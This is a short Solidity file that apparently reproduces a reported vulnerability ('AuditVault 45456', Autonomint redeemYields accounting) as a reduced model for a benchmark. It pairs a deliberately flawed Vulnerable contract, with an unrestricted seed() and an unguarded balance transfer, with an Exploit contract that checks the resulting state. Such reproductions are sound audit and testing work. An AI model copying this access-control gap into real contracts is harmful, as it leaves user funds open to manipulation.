// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 45456: Autonomint redeemYields accounting. Reduced local model preserves the reported state transition.

contract Vulnerable {
    mapping(address => uint256) public bond; function seed(address who) external { bond[who] = 100; } function redeemYields(address user, uint256 amount) external { bond[msg.sender] -= amount; bond[user] += amount; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.seed(address(this)); bug.redeemYields(address(0xBEEF), 10); success = bug.bond(address(this)) == 90 && bug.bond(address(0xBEEF)) == 10;
    }
}


